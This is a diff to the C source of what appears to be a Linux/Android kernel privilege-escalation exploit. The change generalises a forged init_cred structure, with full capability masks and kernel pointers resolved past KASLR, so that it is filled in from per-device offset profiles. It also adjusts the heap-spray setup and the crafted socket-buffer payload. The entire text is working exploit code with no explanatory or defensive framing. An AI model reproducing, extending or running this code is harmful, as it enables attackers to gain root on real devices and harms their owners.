@@ -57,10 +57,15 @@ int tcp_route_selected(void) {
   return active_offsets && active_offsets->compact_waiter;
 }
 
+int kernel5_route_selected(void) {
+  return active_offsets && active_offsets->kernel_major == 5 &&
+         active_offsets->mcast_waiter_off > 0;
+}
+
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -209,22 +214,42 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
 
-static void fill_init_cred_copy(unsigned char *p, size_t off) {
+static int fill_profile_cred_copy(unsigned char *p, size_t off) {
+  if (!active_offsets || !active_offsets->cred_copy_size ||
+      active_offsets->cred_copy_size > ORDER3_SIZE ||
+      active_offsets->cred_usage_offset + sizeof(uint32_t) >
+          active_offsets->cred_copy_size ||
+      active_offsets->cred_caps_offset +
+              active_offsets->cred_caps_count * sizeof(uint64_t) >
+          active_offsets->cred_copy_size) {
+    pr_error("credential copy profile is incomplete\n");
+    return 0;
+  }
   unsigned char *c = p + off;
-  /* Exact 0xb0-byte init_cred template from Xperia 67.2.A.3.178. Static
-   * pointer members remain valid through the kernel image mapping. Only the
-   * usage count is raised because the socket-backed copy must stay pinned. */
-  memset(c, 0, 0xb0);
-  put32(c, 0x00, 0x100);
-  put64(c, 0x30, 0x000001ffffffffffULL);
-  put64(c, 0x38, 0x000001ffffffffffULL);
-  put64(c, 0x40, 0x000001ffffffffffULL);
-  /* Runtime KASLR relocates these four canonical image pointers in the real
-   * init_cred. Resolve equivalent direct-map aliases from their image VAs. */
-  put64(c, 0x80, data_addr(0xffffffc00ab23a80ULL));
-  put64(c, 0x88, data_addr(0xffffffc00acce110ULL));
-  put64(c, 0x90, data_addr(0xffffffc00ab23ff0ULL));
-  put64(c, 0x98, data_addr(0xffffffc00ab23b28ULL));
+  memset(c, 0, active_offsets->cred_copy_size);
+  put32(c, active_offsets->cred_usage_offset,
+        active_offsets->cred_usage_value);
+  for (uint32_t i = 0; i < active_offsets->cred_caps_count; i++) {
+    put64(c, active_offsets->cred_caps_offset + i * sizeof(uint64_t),
+          active_offsets->cred_caps_value);
+  }
+
+  const uint32_t ref_offsets[] = {
+      active_offsets->cred_ref0_offset, active_offsets->cred_ref1_offset,
+      active_offsets->cred_ref2_offset, active_offsets->cred_ref3_offset,
+  };
+  const uint64_t ref_images[] = {
+      active_offsets->cred_ref0_image, active_offsets->cred_ref1_image,
+      active_offsets->cred_ref2_image, active_offsets->cred_ref3_image,
+  };
+  for (size_t i = 0; i < active_offsets->cred_ref_count; i++) {
+    if (ref_offsets[i] + sizeof(uint64_t) > active_offsets->cred_copy_size) {
+      pr_error("credential reference %zu exceeds configured copy size\n", i);
+      return 0;
+    }
+    put64(c, ref_offsets[i], data_addr(ref_images[i]));
+  }
+  return 1;
 }
 
 pid_t clone_child(void) {
@@ -526,8 +551,9 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (pselect_custom_write >= 2) {
-      fill_init_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+    if (pselect_custom_write >= 2 &&
+        !fill_profile_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)) {
+      return 0;
     }
   }
   return 1;
@@ -559,7 +585,7 @@ uintptr_t prepare_kernel_page(void) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
